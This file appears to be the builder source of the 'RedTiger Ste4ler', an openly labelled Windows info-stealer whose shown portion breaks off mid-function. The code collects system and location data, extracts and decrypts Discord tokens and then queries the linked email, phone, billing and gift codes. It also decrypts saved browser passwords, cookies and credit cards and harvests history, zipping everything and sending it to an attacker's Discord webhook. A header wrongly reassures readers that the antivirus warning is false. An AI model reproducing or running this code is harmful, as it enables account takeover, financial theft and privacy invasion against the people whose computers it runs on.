# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝


Obligatory = r'''
import sys
import os
import socket
import win32api
import requests

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Shutd0wn(): pass
    
def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

website = "redtiger.shop"
color_embed = 0xa80505
username_embed = 'RedTiger Ste4ler'
avatar_embed = 'https://media.discordapp.net/attachments/1268900329605300234/1270486977539604530/logo_redtiger.png?ex=66b72c73&is=66b5daf3&hm=c26e13dabc0297251613512e6ec2b8c8667550db16769a03cddb66fad8ef7eff&=&format=webp&quality=lossless&width=662&height=662'
footer_text = f"RedTiger Ste4ler"
footer_embed = {
        "text": footer_text,
        "icon_url": avatar_embed,
        }
                 

try: hostname_pc = socket.gethostname()
except: hostname_pc = "None"

try: username_pc = os.getlogin()
except: username_pc = "None"

try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: displayname_pc = "None"

try: ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: ip_address_public = "None"

try: ip_adress_local = socket.gethostbyname(socket.gethostname())
except: ip_adress_local = "None"

try:
    response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('country_code', "None")
    region = api.get('region', "None")
    region_code = api.get('region_code', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('latitude', "None")
    longitude = api.get('longitude', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")
except:
    response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('countryCode', "None")
    region = api.get('regionName', "None")
    region_code = api.get('region', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('lat', "None")
    longitude = api.get('lon', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sy5t3mInf0 = r'''
def Sy5t3m_Inf0():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import requests
    from discord import SyncWebhook, Embed

    try: sy5t3m_1nf0 = {platform.system()}
    except: sy5t3m_1nf0 = "None"

    try: sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: sy5t3m_v3r5i0n_1nf0 = "None"

    try: m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: m4c_4ddr355 = "None"

    try: hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: hw1d = "None"

    try: r4m_1nf0 = round(psutil.virtual_memory().total / (1024**3), 2)
    except: r4m_1nf0 = "None"

    try: cpu_1nf0 = platform.processor()
    except: cpu_1nf0 = "None"

    try: cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except: cpu_c0r3_1nf0 = "None"

    try: gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: gpu_1nf0 = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        d15k_5t4t5 = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            d15k_5t4t5 += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        d15k_5t4t5 = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            p14tf0rm_1nf0 = 'Pc Portable'
        else:
            p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        p14tf0rm_1nf0 = "None"

    try: scr33n_number = len(screeninfo.get_monitors())
    except: scr33n_number = "None"

    embed = Embed(title=f'System Info `{username_pc} "{ip_address_public}"`:', color=color_embed)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {hostname_pc}
Username    : {username_pc}
DisplayName : {displayname_pc}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {p14tf0rm_1nf0}
Exploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}
Screen Number : {scr33n_number}

HWID : {hw1d}
MAC  : {m4c_4ddr355}
CPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core
GPU  : {gpu_1nf0}
RAM  : {r4m_1nf0}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {ip_address_public}
Local  : {ip_adress_local}
Isp    : {isp}
Org    : {org}
As     : {as_number}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{d15k_5t4t5}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {country} ({country_code})
Region    : {region} ({region_code})
Zip       : {zip_postal}
City      : {city}
Timezone  : {timezone}
Latitude  : {latitude}
Longitude : {longitude}```""", inline=False)

    embed.set_footer(text=footer_text, icon_url=avatar_embed)

    w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
    w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Di5c0rdT0k3n = r'''

def Di5c0rd_T0k3n():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import scrypt
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def extr4ct_t0k3n5():
        base_url = "https://discord.com/api/v9/users/@me"
        appdata_local = os.getenv("localappdata")
        appdata_roaming = os.getenv("appdata")
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        t0k3n5 = []
        uids = []
        token_info = {}

        paths = {
            'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata_local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': appdata_local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': appdata_local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': appdata_local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': appdata_local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': appdata_local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': appdata_local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata_local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata_local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata_local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata_local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(appdata_roaming + f'\\{_d15c0rd}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for y in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(appdata_roaming + f'\\{_d15c0rd}\\Local State'))
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")

        if os.path.exists(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if _file.endswith('.sqlite'):
                        with open(f'{path}\\{_file}', errors='ignore') as file:
                            for line in file:
                                for t0k3n in re.findall(regexp, line.strip()):
                                    if validate_t0k3n(t0k3n, base_url):
                                        uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                        if uid not in uids:
                                            t0k3n5.append(t0k3n)
                                            uids.append(uid)
                                            token_info[t0k3n] = ('Firefox', f"{path}\\{_file}")
        return t0k3n5, token_info

    def validate_t0k3n(t0k3n, base_url):
        return requests.get(base_url, headers={'Authorization': t0k3n}).status_code == 200

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()

    def get_master_key(path):
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        t0k3n5, token_info = extr4ct_t0k3n5()
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

        if not t0k3n5:
            embed = Embed(
                title=f'Discord Token `{username_pc} "{ip_address_public}"`:', 
                description=f"No discord tokens found.",
                color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
            return
        
        for t0k3n_d15c0rd in t0k3n5:
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()

            u53rn4m3_d15c0rd = api.get('username', "None") + '#' + api.get('discriminator', "None")
            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
            us3r_1d_d15c0rd = api.get('id', "None")
            em4i1_d15c0rd = api.get('email', "None")
            ph0n3_d15c0rd = api.get('phone', "None")
            c0untry_d15c0rd = api.get('locale', "None")
            mf4_d15c0rd = api.get('mfa_enabled', "None")

            try:
                if api.get('premium_type', 'None') == 0:
                    n1tr0_d15c0rd = 'False'
                elif api.get('premium_type', 'None') == 1:
                    n1tr0_d15c0rd = 'Nitro Classic'
                elif api.get('premium_type', 'None') == 2:
                    n1tr0_d15c0rd = 'Nitro Boosts'
                elif api.get('premium_type', 'None') == 3:
                    n1tr0_d15c0rd = 'Nitro Basic'
                else:
                    n1tr0_d15c0rd = 'False'
            except:
                n1tr0_d15c0rd = "None"

            try: 
                av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
            except: 
                av4t4r_ur1_d15c0rd = avatar_embed

            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []

                    for method in billing_discord:
                        if method['type'] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append('CB')
                        elif method['type'] == 2:
                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                        else:
                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                else:
                    p4ym3nt_m3th0d5_d15c0rd = "None"
            except:
                p4ym3nt_m3th0d5_d15c0rd = "None"

            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                        data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                else:
                    g1ft_c0d35_d15c0rd = "None"
            except:
                g1ft_c0d35_d15c0rd = "None"
        
            software_name, path = token_info.get(t0k3n_d15c0rd, ("Unknown Software", "Unknown location"))

            embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
            embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
            embed.add_field(name=":file_folder: Path:", value=f"```{path}```", inline=False)
            embed.add_field(name=":package: Software:", value=f"```{software_name}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{u53rn4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_d15c0rd}```", inline=True)
            embed.add_field(name=":e_mail: Email:", value=f"```{em4i1_d15c0rd}```", inline=True)
            embed.add_field(name=":telephone_receiver: Phone:", value=f"```{ph0n3_d15c0rd}```", inline=True)   
            embed.add_field(name=":globe_with_meridians: Token:", value=f"```{t0k3n_d15c0rd}```", inline=True)
            embed.add_field(name=":rocket: Nitro:", value=f"```{n1tr0_d15c0rd}```", inline=True)
            embed.add_field(name=":earth_africa: Language:", value=f"```{c0untry_d15c0rd}```", inline=True)
            embed.add_field(name=":moneybag: Billing:", value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
            embed.add_field(name=":gift: Gift Code:", value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
            embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{mf4_d15c0rd}```", inline=True)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

    upload_t0k3n5()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Br0w53r5t341 = r'''
def Br0w53r_5t341():
    import os
    import shutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from zipfile import ZipFile
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from discord import SyncWebhook, Embed, File
    from pathlib import Path

    PASSWORDS = []
    COOKIES = []
    HISTORY = []
    DOWNLOADS = []
    CARDS = []
    browsers = []

    def Br0ws53r_Main():
        appdata_local = os.getenv('LOCALAPPDATA')
        appdata_roaming = os.getenv('APPDATA')
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            

        Browser = {
            'Google Chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
            'Microsoft Edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(appdata_roaming, 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Internet Explorer': os.path.join(appdata_local, 'Microsoft', 'Internet Explorer'),
            'Amigo': os.path.join(appdata_local, 'Amigo', 'User Data'),
            'Torch': os.path.join(appdata_local, 'Torch', 'User Data'),
            'Kometa': os.path.join(appdata_local, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(appdata_local, 'Orbitum', 'User Data'),
            'Cent Browser': os.path.join(appdata_local, 'CentBrowser', 'User Data'),
            '7Star': os.path.join(appdata_local, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(appdata_local, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Google Chrome SxS': os.path.join(appdata_local, 'Google', 'Chrome SxS', 'User Data'),
            'Epic Privacy Browser': os.path.join(appdata_local, 'Epic Privacy Browser', 'User Data'),
            'Uran': os.path.join(appdata_local, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
            'Iridium': os.path.join(appdata_local, 'Iridium', 'User Data'),
            'Mozilla Firefox': os.path.join(appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'Safari': os.path.join(appdata_roaming, 'Apple Computer', 'Safari'),
        }

        profiles = [
            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
        ]

        for browser, path in Browser.items():
            if not os.path.exists(path):
                continue

            master_key = get_master_key(os.path.join(path, 'Local State'))
            if not master_key:
                continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

                get_passwords(browser, path, profile_path, master_key)
                get_cookies(browser, path, profile_path, master_key)
                get_history(browser, path, profile_path)
                get_downloads(browser, path, profile_path)
                get_cards(browser, path, profile_path, master_key)

                if browser not in browsers:
                    browsers.append(browser)

        write_files(username_pc)
        send_files(username_pc, w3bh00k)
        clean_files(username_pc)

    def get_master_key(path):
        if not os.path.exists(path):
            return None

        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        except:
            return None

    def list_tables(db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            conn.close()
            return tables
        except:
            return []

    def get_passwords(browser, path, profile_path, master_key):
        password_db = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(password_db):
            return

        shutil.copy(password_db, 'password_db')
        tables = list_tables('password_db')

        conn = sqlite3.connect('password_db')
        cursor = conn.cursor()

        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            PASSWORDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url =      f"- Url      : {row[0]}"
                username = f"  Username : {row[1]}"
                password = f"  Password : {decrypt_password(row[2], master_key)}"
                PASSWORDS.append(f"{url}\n{username}\n{password}\n")
        except:
            pass
        finally:
            conn.close()
            os.remove('password_db')

    def get_cookies(browser, path, profile_path, master_key):
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            return

        conn = None 
        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            COOKIES.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                url =    f"- Url    : {row[0]}"
                name =   f"  Name   : {row[1]}"
                path =   f"  Path   : {row[2]}"
                cookie = f"  Cookie : {decrypt_password(row[3], master_key)}"
                expire = f"  Expire : {row[4]}"
                COOKIES.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n")
        except:
            pass
        finally:
            if conn:
                conn.close()
            try:
                os.remove('cookie_db')
            except:
                pass


    def get_history(browser, path, profile_path):
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return

        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        HISTORY.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            url =   f"- Url   : {row[0]}"
            title = f"  Title : {row[1]}"
            time =  f"  Time  : {row[2]}"
            HISTORY.append(f"{url}\n{title}\n{time}\n")

        conn.close()
        os.remove('history_db')

    def get_downloads(browser, path, profile_path):
        downloads_db = os.path.join(profile_path, 'History')
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        DOWNLOADS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            path = f"- Path : {row[1]}"
            url =  f"  Url  : {row[0]}"
            DOWNLOADS.append(f"{path}\n{url}\n")

        conn.close()
        os.remove('downloads_db')

    def get_cards(browser, path, profile_path, master_key):
        cards_db = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        CARDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            name =             f"- Name             : {row[0]}"
            expiration_month = f"  Expiration Month : {row[1]}"
            expiration_year =  f"  Expiration Year  : {row[2]}"
            card_number =      f"  Card Number      : {decrypt_password(row[3], master_key)}"
            date_modified =    f"  Date Modified    : {row[4]}"
            CARDS.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n")

        conn.close()
        os.remove('cards_db')

    def write_files(username_pc):
        os.makedirs(f"Browser_{username_pc}", exist_ok=True)

        if PASSWORDS:
            with open(f"Browser_{username_pc}\\Passwords_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(PASSWORDS))

        if COOKIES:
            with open(f"Browser_{username_pc}\\Cookies_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(COOKIES))

        if HISTORY:
            with open(f"Browser_{username_pc}\\History_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(HISTORY))

        if DOWNLOADS:
            with open(f"Browser_{username_pc}\\Downloads_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(DOWNLOADS))

        if CARDS:
            with open(f"Browser_{username_pc}\\Cards_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(CARDS))

        with ZipFile(f"Browser_{username_pc}.zip", "w") as zipf:
            for file in os.listdir(f"Browser_{username_pc}"):
                zipf.write(os.path.join(f"Browser_{username_pc}", file), file)

    def send_files(username_pc, w3bh00k):
        w3bh00k.send(
            embed=Embed(
                title=f'Browser Steal  `{username_pc} "{ip_address_public}"`:',
                description=f"Found In **{'**, **'.join(browsers)}**:```" + '\n'.join(tree(Path(f"Browser_{username_pc}"))) + "```",
                color=color_embed,
            ).set_footer(
                text=footer_text,
                icon_url=avatar_embed
            ),
            file=File(fp=f"Browser_{username_pc}.zip", filename=f"Browser_{username_pc}.zip"),
        )

    def clean_files(username_pc):
        shutil.rmtree(f"Browser_{username_pc}")
        os.remove(f"Browser_{username_pc}.zip")

    def tree(path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
